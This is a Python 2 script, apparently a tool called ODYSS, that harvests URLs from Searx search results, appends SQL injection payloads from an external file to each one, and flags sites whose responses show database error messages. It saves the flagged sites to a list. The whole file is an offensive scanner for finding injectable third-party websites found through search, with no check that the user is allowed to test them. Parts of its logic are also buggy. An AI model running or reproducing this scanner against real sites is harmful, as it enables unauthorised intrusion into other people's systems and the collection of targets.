# -*- coding: utf-8 -*-
import requests
import re
from prettytable import PrettyTable



white = '\033[1;97m'
green = '\033[1;32m'
red = '\033[1;31m'
yellow = '\033[1;33m'
blue = '\033[1;34m'

end = '\033[1;m'
info = '\033[1;33m[!]\033[1;m'
que =  '\033[1;34m[?]\033[1;m'
bad = '\033[1;31m[-]\033[1;m'
good = '\033[1;32m[+]\033[1;m'
run = '\033[1;97m[~]\033[1;m'

sql_errors = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"Warning.*PostgreSQL"),
    "Microsoft SQL Server": (r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*odbc_.*", r"Warning.*mssql_", r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark after the character string", r"Microsoft OLE DB Provider for ODBC Drivers"),
    "Microsoft Access": (r"Microsoft Access Driver", r"Access Database Engine", r"Microsoft JET Database Engine", r".*Syntax error.*query expression"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Warning.*oci_.*", "Microsoft OLE DB Provider for Oracle"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error"),
    "SQLite": (r"SQLite/JDBCDriver", r"System.Data.SQLite.SQLiteException"),
    "Informix": (r"Warning.*ibase_.*", r"com.informix.jdbc"),
    "Sybase": (r"Warning.*sybase.*", r"Sybase message")
}



print '''%s
 _______  ______            _______  _______ 
(  ___  )(  __  \\ |\\     /|(  ____ \\(  ____ \\
| (   ) || (  \\  )( \\   / )| (    \\/| (    \\/
| |   | || |   ) | \\ (_) / | (_____ | (_____ 
| |   | || |   | |  \\   /  (_____  )(_____  )
| |   | || |   ) |   ) (         ) |      ) |
| (___) || (__/  )   | |   /\\____) |/\\____) |
(_______)(______/    \\_/   \\_______)\\_______) %sV1
''' % (red, white)

print "%s Info | %s Queue | %s Bad | %s Good | %s Run \n" %(info, que, bad, good, run)

############
# Check Url 
############
def check_url(url):
    pattern = re.compile(r'\http:/\/\.\b')

    if pattern.match(url) is None:
        url = 'http://' + url

    try:
        urlRequest = requests.get(url)
    except requests.exceptions.RequestException as e:
        print "%s Please Enter a Valid URL" % bad
        initiator()
    else:
        return url

#############
# Format URL 
#############
def format_url(url, query, pageno):

    return '%s/?q=%s&pageno=%s&categories=general&language=en-US&format=json' % (url, query, pageno)

###############
# Check Server
###############

def check_server():
    hasLocal = raw_input('%s ¿You have Searx on Local? (YES/no):: ' % que) or 'yes'

    if hasLocal == 'yes' or hasLocal == 'YES':
        url = raw_input('%s ¿What is the URL? (localhost:8888):: ' % que) or 'localhost:8888'

    else:
        url = 'searx.me'
    url = check_url(url)
    return url

##############
# Term Search
##############

def term_search(query = None, numberPages = None):
    url = check_server()

    if numberPages is None:
        numberPages = raw_input('%s Enter number of Pages (1):: ' % que) or '1'

    if query is None:
        query = raw_input('%s Enter your query to SearX:: ' % que)

        if not query:
            print '\n%s Please Enter a Query' % bad
            term_search(None, numberPages)

    urls = []

    for number in range(1,int(numberPages)+1):
        urls.append(format_url(url, query, number))

    return urls

########
# SearX 
########

def searx(url):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; theme=oscar; results_on_new_tab=0; doi_resolver=oadoi.org; language=en-US; locale=en; image_proxy=; categories=general; method=POST; disabled_engines=; enabled_engines="yandex__general\054duckduckgo__general\054yahoo__general"; disabled_plugins=; enabled_plugins=; oscar-style=logicodev; redux_current_tab=1; redux_current_tab_get=1',
        'Host': 'localhost:8888',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    print "\n%s Starting Searx...\n" % run

    urlRequest = requests.get(url, headers=headers)
    data = urlRequest.json()

    print '%s %s Entries found' % (good, str(len(data['results'])))
    sqli_scanner(data['results'])

###############
# SQLi Scanner 
###############

def sqli_scanner(urls, payloads='plugins/sqli.txt'):
    with open(payloads) as f:
        payloadsContent = f.readlines()

    payloads = [x.strip() for x in payloadsContent]
    sitesVuln = []
    table = PrettyTable(["URL", "PAYLOAD", "DB"])
    table.align["URL"] = 'l'
    table.padding_width = 1

    for page in urls:

        if page['engine'] == "google":
            engine = "%s [%s]" %(green, page['engine'])
        elif page['engine'] == 'bing':
            engine = "%s [%s]" %(yellow, page['engine'])
        else:
            engine = "%s [%s]" % (white, page['engine'])

        for payload in payloads:
            try:
                request = requests.get(page['url']+payload)
            except requests.exceptions.RequestException:
                pass

            hasError = sqli_errors_check(request.text)

            if hasError[0]:
                if not page['url'] in sitesVuln:
                    print "%s Engine %s %s => %s %s %s [SQLi]" % (good, engine, white, green, page['url'], blue)
                    sitesVuln.append([page['url'], payload, hasError[2]])
            else:
                print "%s Engine %s %s => %s %s " % (bad, engine, white, green, page['url'])
            break

    saveEntries = raw_input("\n%s ¿Want to save the found entries?(YES/no):: " % que) or 'yes'
    if saveEntries == 'yes' or saveEntries == 'YES':
        fileToSave = './sites.txt'
        file = open(fileToSave, 'a')

    for site in sitesVuln:
        if saveEntries == 'yes' or saveEntries == 'YES':
            with open(fileToSave) as myfile:
                if not site[0] in myfile.read():
                    file.write(site[0] + '\n')

        table.add_row([site[0], site[1], site[2]])
    file.close()
    print table



####################
# SQLi Errors Check
####################

def sqli_errors_check(html):
    """
    thanks to sqliv for this method
    https://github.com/Hadesy2k/sqliv/
    """
    for db, errors in sql_errors.items():
        for error in errors:
            if re.compile(error).search(html):
                return True, error, db
    return False, None

def initiator():
    urls = term_search()
    print urls
    for url in urls:
        searx(url)

initiator()